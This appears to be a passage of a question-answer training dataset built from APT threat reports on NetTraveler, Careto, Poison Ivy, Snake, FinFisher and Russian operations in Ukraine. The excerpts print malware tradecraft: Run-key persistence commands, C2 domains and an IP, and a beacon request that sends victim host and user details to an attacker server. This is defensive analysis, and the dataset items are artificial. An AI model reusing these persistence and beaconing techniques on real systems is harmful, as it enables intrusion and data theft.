string>=1\nthis is done to avoid copying files that were already copied before, unless they were changed by the user.\nto avoid excessive use of the disk drive and occasional interest of the local user, the file copying procedure has a delay. every 1000 files the thread delays execution and sleeps for 9 seconds.\nVery Small Headline: useless text transformation\nin function which gets disk volume serial number the actual serial number is converted from a decimal integer to a hexadecimal number stored as an Ascii string. the integer is converted to\na string with call to the \"sprintf' function and \"%8x\" parameter which outputs 8 characters representing a number in hexadecimal form. despite the fact that the output of this call is in uppercase, the author of the module converts the output to uppercase characters again. this could be due to the fact that the author used to have \"%8x\" format string before, which made such conversion rational. however, that clearly shows that the developer wasn't aware of various format strings options, which shows lack of experience in c/c++ development.\nVery Small Headline: Drive monitoring disk processing issue\nAs we mentioned above the drive monitoring thread uses the same function to process removable usb drives and network shares attached as local drives. Visible separation of these two types of disk drives (in the name of the options Gsearch and usearch, where \"u\" probably stands for \"usb\" and \"G\" is for \"Global\", and in separate logical branches of code flow) is later misused, as the drive processing routines is bound to usb drives. At least it read u-prefixed options from dnlist.ini file, which logically corresponds to the usb-type of disk drive, but used for both. While this is a minor issue and probably didn't cause a serious problem for the attackers, this shows that the developer felt lazy at some point and used copy and Paste approach to avoid creating extra code. it could also mean that one part of the code was created by one person and later modified by another, who mistakenly overlooked general code design.\nVery\nAnswer this question: What is the purpose of the 'uenumfs.ini' file in the NetTraveler malware, and how is it used during the processing of newly attached disk drives?",
    "output": "The 'uenumfs.ini' file in the NetTraveler malware is used to store directories and subdirectories listings of the attached disk drive. When a new removable device is attached, the malware creates the %Temp%\\ntvba00.tmp\\ directory and opens 'uenumfs.ini' for writing. This file is filled with the listings in a format similar to the one created during the fixed drive filesystem scan. The malware applies the same criteria (size and file extension) to each file and calculates a state ID as an MD5 hash of the filename and timestamp of the last modification. This hash is used to generate a new file path in the %Temp%\\ntvba00.tmp\\ directory, preserving the original extension but changing the file name to avoid encoding issues.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the TA402 APT group use Masquerading techniques to evade detection and deliver the NimbleMamba malware?",
    "output": "Masquerading is a technique used by adversaries to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. In the case of the TA402 APT group, they employed Masquerading techniques to deliver the NimbleMamba malware. Specifically, they used actor-controlled domains and Gmail accounts to masquerade as legitimate entities, such as the Quora website. They also used Dropbox URLs to deliver the malicious RAR files, which allowed them to blend in with legitimate email traffic. Furthermore, the malware itself used guardrails to ensure that it only executed on targeted machines, and it used the Dropbox API for command and control communication, making it harder to detect. Additionally, the malware was obfuscated using third-party obfuscators, such as SmartAssembly, to make it more difficult to analyze. The use of these Masquerading techniques demonstrates the TA402 group's determination to evade detection and deliver their malware to their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does 'The Mask' APT campaign ensure persistence and evasion on compromised systems? Describe the installation process and techniques used.",
    "output": "The 'Careto' software package, part of 'The Mask' APT campaign, ensures persistence through a standalone executable installer. The installer extracts components and sets them up on the victim machine. It is compiled with Visual Studio 2005 and contains encrypted strings and payloads. The installer checks for the presence of a 'BaseNamedObject' EVENT with '*' in the data to avoid multiple installations. It uses a fixed RC4 key for decryption. The payload is installed based on system architecture (32-bit or 64-bit) and Windows version. To evade detection, it assigns the same file timestamp as 'kernel32.dll' and modifies the EXE's resources to mimic legitimate system files. The payload is registered as a COM object via registry entries to maintain persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the multi-stage PowerShell execution process used in the Poison Ivy campaign. How did the threat actors ensure persistence and minimize detection through this method?",
    "output": "The threat actors used a multi-stage PowerShell execution process to deliver the Poison Ivy backdoor. The initial PowerShell script downloaded a decoy document to minimize user suspicion and then executed another PowerShell script named f0921.ps1. The third stage PowerShell script configured an encoded PowerShell command as a base64 string in the HKCU:\\Console\\FontSecurity registry key. This script also set another registry value named HKCU\\CurrentVersion\\Run\\SecurityUpdate to launch the encoded PowerShell payload stored in the FontSecurity key upon user login. By spreading the payload across multiple PowerShell scripts and storing them in the registry, the threat actors made the execution difficult to trace and avoided writing executables to disk, thereby minimizing detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Crimea and Donbass\nBy the end of April 2014, the Russian Government had responded to these events by occupying and annexing the Ukrainian peninsula of Crimea, as well as military intervention in eastern Ukraine, where hostilities continue to this day.\nFrom the start of its Crimean operation, the Russian army moved to gain control of the peninsula's telecommunications infrastructure, severing cables and routing calls through Russian mobile operators. Ukrainian media companies lost their physical assets in Crimea, and local television programming shifted from Ukrainian to Russian channels. With physical access to its control infrastructure, Russia also commandeered the Ukrainian national satellite platform Lybid.\nFrom the start of its Crimean operation, the Russian army moved to gain control of telecommunications infrastructure.\nIn Kyiv, as soon as the Russian military occupied Crimea, the internal security staff of one of Ukraine's largest mobile operators immediately demanded the severing of communications links between Ukraine and the occupied territory. However, its pro-Russian management refused, and maintained unrestricted connectivity as long as possible, likely so that Russian security services could retain access to its internal systems, for intelligence gathering and other information operations.\nUkrainian mobile operators saw an increase in the volume of cyber crime emanating from Crimea, and it is likely that Russian security services acquired intelligence from information collected in this way.\nPro-Russia media, discussion forums, and social network groups were active in propaganda dissemination. The Crimea campaign was even buttressed by mass changes in Wikipedia, where Russian propaganda teams altered articles related to the events taking place there.\nToday in Crimea, Russian authorities have implemented content filtering for internet access, including the censorship of Ukrainian news sites. In November 2014, Russia announced it would create a cyber warfare-specific military unit in Crimea.\nPro-Ukrainian hackers have attacked Crimean websites during the occupation, such as that of the Crimean Parliament7 and a site linking to public web cameras.8 They have also released allegedly official Russian documents related to the conflict which were claimed to be stolen from Russian government servers.9\nAs the conflict shifted to Donbass, cyberspace played an increasingly important role in military operations. Physical attacks destroyed cabling, broadcast infra-\nstructure, and ATM networks, and this served to isolate the region from Ukrainian media, communications, and financial services.10 Military operations were coordinated with propaganda disseminated on Russian TV channels and internet-based media. Finally, the occupation army performs regular forensics checks on computers and mobile devices owned by the population in eastern Ukraine.\n7 'Vulnerabilities in (<http://www.rada.crimea.ua',12>)www.rada.crimea.ua',12 March 2014, Websecurity (<http://websecurity.com.ua/7041/>)http://websecurity.com.ua/7041/.\n8 'Ukrainian Cyber Army: video intelligence', Websecurity April 23, 2015, (<http://websecurity.com.ua/7717/>)http://websecurity.com.ua/7717/.\n9 Aric Toler. 'Russian Official Account of Attack on Ukraine Border Guards', bellingcat, 30 May 2015 (<https://www.bellingcat.com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/>)https://www.bellingcat. (<https://www.bellingcat.com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/>)com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/.\nRussian signals intelligence (SIGINT), including cyber espionage, has allowed for very effective combat operations planning against the Ukrainian army. Artillery fire can be adjusted based on location data gleaned from mobile phones and Wi-Fi networks.11 GPS signals can also be used to jam aerial drones. Ukrainian mobile traffic can be rerouted through Russian GSM infrastructure via a GSM signalling level (SS7) attack;12 in one case, this was accomplished through malicious VLR/HLR updates that were not properly filtered. Russian Security Services also use the internet to recruit mercenaries.\nRussian signals intelligence (SIGINT) has allowed for effective combat operations against the Ukrainian army.\nGenerally speaking, the computer systems and mobile communications of Ukrainian government, military, and critical infrastructure are under permanent attack, and their communications are routinely intercepted and analysed for information of intelligence value. There are also many attacks on Ukrainian businesses: examples include the Ukrainian Railway Company, Kievstar mobile operator,13 a SMART-TV retail shop,14 and a city billboard.15\n\nQ: What role did Russian signals intelligence (SIGINT) play in the conflict in Donbass, and how did it enhance combat operations against the Ukrainian army?",
    "output": "A: Russian signals intelligence (SIGINT), including cyber espionage, significantly enhanced combat operations against the Ukrainian army in Donbass. SIGINT allowed for effective combat operations planning by adjusting artillery fire based on location data obtained from mobile phones and Wi-Fi networks. GPS signals were used to jam aerial drones. Ukrainian mobile traffic was rerouted through Russian GSM infrastructure via a GSM signalling level (SS7) attack, which was accomplished through malicious VLR/HLR updates that were not properly filtered. This enabled Russian forces to intercept and analyze communications for intelligence purposes, providing a strategic advantage in military operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: File Details\nThe malware does not execute immediately after successful exploitation and instead just creates a Run key in the current user's hive which will execute the next time the victim user accesses the system.\nRegistry Persistence Key\nRegistry Key Value\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Certificates\nRundll32.exe \"%APPDATA%\\Microsoft\\SystemCertificates\\Certificates.ocx\",Setup\nThe ocx file is actually a DLL and provides the attacker the ability to upload, download, enumerate, delete, search, and execute files as well as list drivers on the system. The binary is designed to be called from its one exported function, \"Setup\"; the Run key will ensure that whenever the victim user logs into the system the backdoor will execute. The binary is configured to communicate to \"www.microsoftservices.proxydns.com\" on port 80 using standard HTTP POST and GET requests. The domain at the time of this report resolved to the IP address, \"103.229.125.157\". Additionally the dynamic DNS domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\" have both historically resolved to this IP address.\nMedium Headline: Example initial beacon request:\nGET /login?wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\nHTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nHost: www.microsoftservices.proxydns.com\nCache-Control: no-cache\nThe above beacon request can be decoded by base64 decoding with this alphabet,\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\". Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key. The following python script will make this easy:\nfrom Crypto.Cipher import ARC4 import base64,binascii,string\ndef customb64decode(s): newalphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_' oldalphabet = string.uppercase + string.lowercase + string.digits + \"+/\" s = s.translate(string.maketrans(newalphabet, oldalphabet)) return base64.b64decode(s)\nreq = \"hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-\nH5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==\" unb64 = customb64decode(req) rc4 = ARC4.new(unb64[0:4]) dec = rc4.decrypt(unb64[4::]) print dec\nDecoding the string will yield the following: k:9C18CDFE\ns:masst\nh:<HOSTNAME>\nu:<USERNAME>\no:win32.5.1.2600.2.1.Service Pack 3\nm:<MAC ADDRESS>\nWhere k: is a unique identifier for the victim, s: is a campaign identifier included in the backdoor, h: is the hostname of the victim computer, u: is the victim user, o: is the operating system and service pack level, and m is the mac address.\nBased upon some cursory analysis the backdoor will look for encrypted commands within HTML comments returned from the C2 using the following format: \"<!\u00ad\u00ad?*$@COMMAND GOES HERE@$*?\u00ad\u00ad!>;\"however, the C2 was not active at the time of analysis so this could not be confirmed. The backdoor may also make requests to the C2 over HTTP using the following parameters in the URI string \"query?sid=\" and \"result? sid=\".\nThe PDB path, C:\\Codes\\Eoehttp\\Release\\Eoehttp.pdb, was also left in the backdoor although no other instances of this path could be identified. Several additional exploit documents were identified by investigating the domains \"fighthard.mooo.com\" and \"rampage.freetcp.com\".\nMedium Headline: File Details\nI'm always curious when no registry changes are made in the exploitation process. At first the backdoor failed to load or really do anything in my VM until I read what the \"msascm32.drv\" file does. Looking at the original file's (%WINDIR%\\system32\\msacm32.drv) imported functions, it's clear the DLL is responsible for some type of audio processing and/or playback. A quick search on the internet confirmed this so I added a soundcard to my VM.\nOn reboot explorer.exewas now happy to load the backdoor and get down to business; this technique is known as dll search order hijacking or binary planting. Interestingly the backdoor will also load the legitimate system32\\msacm32.drvfile resolve functions and pass calls to it so it doesn't break audio playback on the victim system. The backdoor contains identical exports as well as an additional dummy function from the legitimate msacm32.drvcalled \"StartWork\" which can be used to reliably identify similar samples. The backdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via LoadLibrary it will begin spawning malicious threads.\nA PDB path was also left in this binary C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80. The two files also have an identical compilation time, which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information.\nThe backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor. It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of \"admin\". The Poison Ivy shellcode is encrypted using a custom cipher with the key \"Tiger324{\" beginning at offset 0xFA5 and ending at 0x159E. If this initial connection fails it will revert to the secondary backdoor, which utilizes HTTP GET and POST requests somewhat similar to the ones described above to the internal IP address \"192.168.2.26\". This suggested the attacker had already compromised other systems in the environment and was using an internal C2 mechanism for a fallback.\n\nQuestion: Why does the malware create a Run key in the current user's hive instead of executing immediately after successful exploitation? What implications does this have for detection and remediation efforts?\n\nAnswer:",
    "output": "The malware creates a Run key in the current user's hive to ensure persistence, meaning it will execute the next time the victim user accesses the system. This approach allows the malware to remain dormant initially, making it harder to detect immediately after infection. For detection and remediation, security professionals need to monitor registry changes and look for suspicious entries in the Run key that might indicate the presence of malware. Removing the Run key entry can prevent the malware from executing on subsequent logins, but further investigation is necessary to ensure complete removal of the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTER-PROCESS COMMUNICATIONS\nAnalysis of the sample reveals that it supports 3 modes of fetching C&C commands.\n\u2022 In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(), InternetReadFile(), etc.\n\u2022 In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(), send(), etc.\n\u2022 In the third mode, it works in the 'pipe server' mode, when it passes the web requests it is interested in (as a client) to the pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes.\nMemory pipes is a common mechanism for Inter-Process Communications (IPC). When the pipe server reads such requests from the pipes, it performs the web request on behalf of a client by using WinINet APIs, so it effectively serves as a proxy.\nThe diagram below demonstrates the last, 'pipe server' mode of Snake operation:\nThe diagram illustrates the operation steps 1-4:\n1 First, the malicious driver with the embedded DLL module injects that DLL into a system process, such as services.exe; once loaded, the DLL will function in the 'pipe server' mode.\n2 As soon as the driver detects a usermode process that goes online (e.g. a browser), it will inject malicious DLL module into it; depending on the operational mode, the DLL may start communicating with C&C directly.\n3 In the 'pipe mode' of operation, the injected DLL will start communicating with the pipe server by sending messages into the established inter-process communication pipes.\n4 Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C, bypassing the host-based firewalls that keep an infected system process in a white-list.\nThe reason behind the pipes usage is to 'legitimise' the outbound web requests, forcing them to originate from the host firewall-friendly system services.\nPipe server is a special mode of the injected DLL. In order to switch into that mode, a dedicated thread is spawned to listen for IPC messages received through the pipes. The memory pipes used by Snake are named as:\n\u2022 \\\\.\\Pipe\\SP[COMPUTERNAME]\n\u2022 \\\\.\\Pipe\\UP[COMPUTERNAME]\nwhere [COMPUTERNAME] is the name of the host computer.\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other operations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry under the aforementioned ShellCore value.\nThis delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as possible. Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/ registry.\nTo delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:\n\u2022 DATA\n\u2022 CREATE\n\u2022 CMD\n\u2022 POST\n\u2022 GET\n\u2022 DEL\n\u2022 REGISTR\n\u2022 COPY\nThe usermode component of Snake communicates with its kernel-mode driver via a device called \\\\.\\vstor32 (created under kernel as \\Device\\vstor32). In its communication protocol with the driver it uses the IOCTL code of 0x222038.\nTo write data, it opens the device with CreateFile(\"\\\\.\\vstor32\"), then calls DeviceIoControl() API on its handle with IOCTL code of 0x222038.\nConfiguration parameters along with the initial set of domain names are hard-coded within the body of the DLL. However, the data appears to be defined in the structures, so it is very likely the DLL could be generated by a stand-alone builder that 'patches' the DLL with the new/updated list of C&C.\nAnalysis of the commands performed by the malware suggests the following capabilities:\n\u2022 Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n\u2022 Set maximum upload file size\n\u2022 Go 'stealth' mode for the specified number of days - Snake will not initiate any connections during that time\n\u2022 Run specified shell commands and collect the output logs for further delivery\n\u2022 Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n\u2022 Search for files\n\u2022 Upload specified files\n\u2022 Add new C&C domains\n\u2022 Update the driver with a new version\n\u2022 Download files\n\u2022 Run specified executable files\n\u2022 Set self-deactivation timeout\n\u2022 If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised system.\nThe ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible, making possible the existence of the hybrid (kernel-centric and usermode-centric) architectures.\nFor example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the communications. If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload task to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and thus, accessible from kernel.\nBig Headline: KERNEL-CENTRIC ARCHITECTURE\nThis particular architecture relies on a kernel-mode driver to carry out the network communications. The usermode DLLs are still injected into the system processes to perform high-level tasks.\nThe delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an exploit across the network (e.g. by using the reconnaissance tool that is explained later).\nInfection starts from a dropper penetrating into the compromised system where it is allowed to run. Once executed, the dropper installs the kernel mode driver in a pre-defined location. The dropper itself is 32-bit, so it will run both on 32-bit and 64-bit Windows OS (in WoW64 mode). On a 32-bit OS, it will install a 32-bit driver. On a 64-bit OS, it will install a 64-bit driver.\nThe analysed 32-bit dropper creates a driver in the following location:\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\nHowever, different samples may use a different path and driver file name. For example, some samples exposed these filenames: fdisk_32.sys, A0009547.sys, or Ultra3.sys. The filename of the dropper could be rkng_inst.exe or fdisk_mon.exe.\n\nAnswer this question based on the above context: How does Snake utilize memory pipes for inter-process communication (IPC) to legitimize outbound web requests and bypass host-based firewalls?",
    "output": "Snake utilizes memory pipes for IPC to legitimize outbound web requests by injecting a malicious DLL module into a system process like services.exe, which functions in the 'pipe server' mode. When the driver detects a usermode process going online, it injects the malicious DLL into it. In the 'pipe mode' of operation, the injected DLL communicates with the pipe server by sending messages through established IPC pipes. The pipe server then communicates with the C&C, bypassing host-based firewalls that whitelist certain system processes. This technique forces the outbound web requests to originate from firewall-friendly system services, making them appear legitimate.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nFinFisher is a sophisticated computer spyware suite, written by Munich\u00adbased FinFisher GmbH, and sold exclusively to governments for intelligence and law enforcement purposes. Although marketed as a tool for fighting crime,the spyware has been involved in a number of high\u00adprofile surveillance abuses. Between 2010 and 2012, Bahrain's government used FinFisher to monitor some of the country's top law firms, journalists, activists, and opposition political leaders. Ethiopian dissidents in exile in the United Kingdom and the United States have also been infected with FinFisher spyware.\nIn 2012 and 2013, Citizen Lab researchers and collaborators,published several reports analyzing FinFisher spyware, and conducted scanning that identified FinFisher command and control (C&C) servers in a number of countries. In our previous research, we were not yet able to differentiate between FinFisher anonymizing proxies and master servers, a distinction that we make in this work.\nWhen a government entity purchases FinFisher spyware, they receive a FinSpy Master\u2014a C&C server that is installed on the entity's premises. The entity may then set up anonymizing proxies (also referred to as \"proxies\" or \"FinSpy Relays\" in the FinFisher documentation), to obscure the location of their master. Infected computers communicate with the anonymizing proxy, which is \"usually\" set up on a Virtual Private Server (VPS) provider in a third country. The proxy then forwards communications between a victim's computer and the Master server.\nWe first describe how we scanned the Internet for FinFisher servers and distinguished masters from proxies (Part 1: Fishing for FinFisher). We then outline our findings regarding 32 governments and 10 specific government entities that we believe are using FinFisher (Part 2: Country Findings). Finally, we highlight several cases that illuminate connections between different threat actors (Part 3: A Deeper Analysis of Several Cases), before concluding (Conclusion).\nP 1: Fi hi f Fi Fi h\n\nHow does the FinFisher spyware suite, developed by FinFisher GmbH, utilize anonymizing proxies to obscure the location of its master servers, and what role do these proxies play in the communication between infected computers and the master server?",
    "output": "When a government entity purchases FinFisher spyware, they receive a FinSpy Master\u2014a Command and Control (C&C) server that is installed on the entity's premises. To obscure the location of this master server, the entity may set up anonymizing proxies, also referred to as 'proxies' or 'FinSpy Relays' in the FinFisher documentation. These proxies are typically set up on a Virtual Private Server (VPS) provider in a third country. The infected computers communicate with the anonymizing proxy, which then forwards communications between the victim's computer and the Master server. This setup helps to hide the true location of the master server, adding a layer of anonymity and making it more difficult to trace the origin of the surveillance.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nCrime and espionage form a dark underworld of cyberspace. Whereas crime is usually the first to seek out new opportunities and methods, espionage usually follows in its wake, borrowing techniques and tradecraft. The Shadows in the Cloud report illustrates the increasingly dangerous ecosystem of crime and espionage and its embeddedness in the fabric of global cyberspace.\nThis ecosystem is the product of numerous factors. Attackers employ complex, adaptive attack techniques that demonstrate high-level ingenuity and opportunism. They take advantage of the cracks and fissures that open up in the fast-paced transformations of our technological world. Every new software program, social networking site, cloud computing, or cheap hosting service that is launched into our everyday digital lives creates an opportunity for this ecosystem to morph, adapt, and exploit.\nIt has also emerged because of poor security practices of users, from individuals to large organizations. We take for granted that the information and communications revolution is a relatively new phenomenon, still very much in the midst of unceasing epochal change. Public institutions have adopted these new technologies faster than procedures and rules have been created to deal with the radical transparency and accompanying vulnerabilities they introduce.\nToday, data is transferred from laptops to USB sticks, over wireless networks at caf\u00e9 hot spots, and stored across cloud computing services whose servers are located in far-off political jurisdictions. These new modalities of communicating de-concentrate and disperse the targets of exploitation, multiplying the points of exposure and potential compromise. Paradoxically, documents and data are probably safer in a file cabinet, behind the bureaucrat's careful watch, than they are on the PC today.\nThe ecosystem of crime and espionage is also emerging because of opportunism on the part of actors. Cyber espionage is the great equalizer. Countries no longer have to spend billions of dollars to build globe-spanning satellites to pursue high-level intelligence gathering, when they can do so via the web. We have no evidence in this report of the involvement of the People's Republic of China (PRC) or any other government in the Shadow network. But an important question to be entertained is whether the PRC will take action to shut the Shadow network down. Doing so will help to address long-standing concerns that malware ecosystems are actively cultivated, or at the very least tolerated, by governments like the PRC who stand to benefit from their exploits though the black and grey markets for information and data.\nFinally, the ecosystem is emerging because of a propitious policy environment \u2014 or rather the absence of one \u2014 at a global level. Governments around the world are engaged in a rapid race to militarize cyber space, to develop tools and methods to fight and win wars in this domain. This arms race creates an opportunity structure ripe for crime and espionage to flourish. In the absence of norms, principles and rules of mutual restraint at a global level, a vacuum exists for subterranean exploits to fill.\nThere is a real risk of a perfect storm in cyberspace erupting out of this vacuum that threatens to subvert cyberspace itself, either through over-reaction, a spiraling arms race, the imposition of heavy-handed controls, or through gradual irrelevance as people disconnect out of fear of insecurity.\nThere is, therefore, an urgent need for a global convention on cyberspace that builds robust mechanisms of information sharing across borders and institutions, defines appropriate rules of the road for engagement in the cyber domain, puts the onus on states to not tolerate or encourage mischievous networks whose activities operate from within their jurisdictions, and protects and preserves this valuable global commons.\nUntil such a normative and policy shift occurs, the shadows in the cloud may grow into a dark, threatening storm.\nRon Deibert\nDirector, the Citizen Lab, Munk School of Global Affairs\nUniversity of Toronto\nRafal Rohozinski\nCEO, The SecDev Group (Ottawa)\nBig Headline: Acknowledgments\nThis investigation is a result of a collaboration between the Information Warfare Monitor and the Shadowserver Foundation. Our ability to share critical information and analytical insights within a dedicated group of professionals allowed us to uncover and investigate the operation of the network documented in this report. The Information Warfare Monitor (infowar-monitor.net) is a joint activity of the Citizen Lab, Munk School of Global Affairs, University of Toronto, and the SecDev Group, an operational consultancy based in Ottawa specialising in evidence-based research in countries and regions under threat of insecurity and violence. The Shadowserver Foundation (shadowserver.org) was established in 2004 and is comprised of volunteer security professionals that investigate and monitor malware, botnets, and malicious attacks. Both the Information Warfare Monitor and the Shadowserver Foundation aim to understand and accurately report on emerging cyber threats as they develop.\nSteven Adair is a security researcher with the Shadowserver Foundation. He frequently analyzes malware, tracks botnets, and deals with cyber attacks of all kinds with a special emphasis on those linked to cyber espionage.\nRon Deibert is Director of the Citizen Lab at the Munk School of Global Affairs, University of Toronto. He is a co-founder and principal investigator of the OpenNet Initiative and Information Warfare Monitor. He is Vice President, Policy and Outreach, Psiphon Inc., and a principal with the SecDev Group.\nRafal Rohozinski is CEO of the SecDev Group and Psiphon Inc. He is a co-founder and principal investigator of the OpenNet Initiative and Information Warfare Monitor, and a senior research advisor at the Citizen Lab, Munk School of Global Affairs, University of Toronto.\nNart Villeneuve is the Chief Security Officer at the SecDev Group, Director of Operations of Psiphon Inc. and a senior SecDev research fellow at the Citizen Lab at the Munk School of Global Affairs, University of Toronto where he focuses on electronic surveillance, targeted malware and politically motivated digital attacks.\nGreg Walton conducted and coordinated the primary field-based research for the Shadow investigation in His Holiness the Dalai Lama's Office and the Tibetan Government-in-Exile in Dharamsala, India. Greg is a SecDev Group associate and editor of the Information Warfare Monitor website. He is the SecDev Fellow at the Citizen Lab at the Munk School of Global Affairs, University of Toronto.\nThis report represents a collective activity and numerous others also contributed to the research effort. This includes individuals in India, who for security reasons we cannot name. We are also grateful to the Office of His Holiness the Dalai Lama. The research of the Citizen Lab and the Information Warfare Monitor is supported by a generous grant from the John D. and Catherine T. MacArthur Foundation, in-kind and staff contributions from the SecDev Group, and a generous donation of software from Palantir Technologies Inc. We are very grateful to Masashi Crete-Nishihata (Citizen Lab) and Arnav Manchanda (SecDev Group) for research assistance, and to Jane Gowan (Agent 5 Design and Citizen Lab) for layout and design.\n\nQ: What urgent need does the 'Shadows in the Cloud' report identify to address the growing threats in cyberspace, and what specific measures are proposed to mitigate these risks?",
    "output": "A: The 'Shadows in the Cloud' report identifies an urgent need for a global convention on cyberspace to address the growing threats posed by crime and espionage. Specific measures proposed include building robust mechanisms for information sharing across borders and institutions, defining appropriate rules of engagement in the cyber domain, placing the onus on states to not tolerate or encourage malicious networks operating within their jurisdictions, and protecting and preserving the global commons of cyberspace. Without such a normative and policy shift, the report warns that the shadows in the cloud may evolve into a dark, threatening storm.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix A: Authenticode/Digital Certificates\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n4e:eb:08:05:55:f1:ab:f7:09:bb:a9:ca:e3:2f:13:cd\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=ZA, O=Thawte Consulting (Pty) Ltd., CN=Thawte Code Signing CA       Validity\nNot Before: Jun 19 00:00:00 2009 GMT\nCN=MGAME Corp.\nSubject Public Key Info:\n+.....7.......\nAuthority Information Access:\nOCSP - URI:http://ocsp.thawte.com\nNetscape Cert Type:\nObject Signing\nSignature Algorithm: sha1WithRSAEncryption\n8c:ea:48:e7:9f:4e:d9:49:9c:54:b2:56:02:0a:ce:d5:3a:5b:\nb7:2b:a6:8b:c2:13:08:6d:13:8f:17:af:d8:96:5c:13:f5:80:\n5a:ec:bd:e7:be:76:85:84:76:82:6a:23:af:47:1b:0c:c4:fe:      a3:cc:59:21:fd:c6:97:32:8b:6c:f3:34:ed:b3:b1:2a:4a:b3:\n22:60:83:06:3b:36:c9:6c:c0:78:08:5c:de:1c:3d:09:49:73:\na7:35:22:27:d6:19:ee:41:f6:10:fc:64:78:dc:dc:b2:79:82:\n2a:61:2f:3e:cb:d7:7f:cf:fe:0f:4e:ab:47:d6:94:5b:84:40:      f7:20\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\nda:61:49:95:64:a7:f1:8e:be:8b:03:b7:12:c2:9e:09\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=US, O=WoSign, Inc., CN=WoSign Code Signing Authority      Validity\nNot Before: Aug 13 00:00:00 2010 GMT\nNot After : Aug 13 23:59:59 2011 GMT\nSubject: C=CN, ST=\\xE6\\xB9\\x96\\xE5\\x8C\\x97\\xE7\\x9C\\x81, L=\\xE6\\xAD\\xA6\\xE6\\ xB1\\x89\\xE5\\xB8\\x82, O=\\xE6\\xAD\\xA6\\xE6\\xB1\\x89\\xE5\\xA4\\xA9\\xE5\\xAE\\xB8\\xE4\\xBF\\xA1\\ xE6\\x81\\xAF\\xE6\\x8A\\x80\\xE6\\x9C\\xAF\\xE6\\x9C\\x89\\xE9\\x99\\x90\\xE5\\x85\\xAC\\xE5\\x8F\\xB8, OU=WoSign Class 3 Code Signing, CN=\\xE6\\xAD\\xA6\\xE6\\xB1\\x89\\xE5\\xA4\\xA9\\xE5\\xAE\\xB8\\ xE4\\xBF\\xA1\\xE6\\x81\\xAF\\xE6\\x8A\\x80\\xE6\\x9C\\xAF\\xE6\\x9C\\x89\\xE9\\x99\\x90\\xE5\\x85\\xAC\\ xE5\\x8F\\xB8\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nRSA Public Key: (2048 bit)\nModulus (2048 